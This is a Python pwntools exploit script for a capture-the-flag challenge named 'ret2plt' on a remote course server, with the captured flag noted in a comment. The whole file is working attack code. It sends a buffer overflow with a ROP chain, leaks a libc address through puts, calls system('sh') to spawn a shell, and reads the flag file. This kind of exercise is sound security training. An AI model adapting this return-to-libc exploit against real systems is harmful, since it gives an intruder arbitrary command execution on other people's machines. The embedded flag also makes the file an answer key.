#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{YOUCAN_RET_2_EVERYWHERE}

e , l = ELF('./ret2plt-012ef76e3de41b4d6859a9379107ffab89b21ae3') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10131
y = remote(host,port)

context.arch = 'amd64'

main = 0x400636
pop_rdi = 0x4006f3


p = flat(
    'D' * 0x28,
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)

y.sendlineafter( ':' , p )

y.recvline()
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']

p = flat(
    'D' * 0x28,
    pop_rdi,
    l.search( 'sh\x00' ).next(),
    l.symbols['system']
)

y.sendlineafter( ':' , p )

sleep(0.7)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()

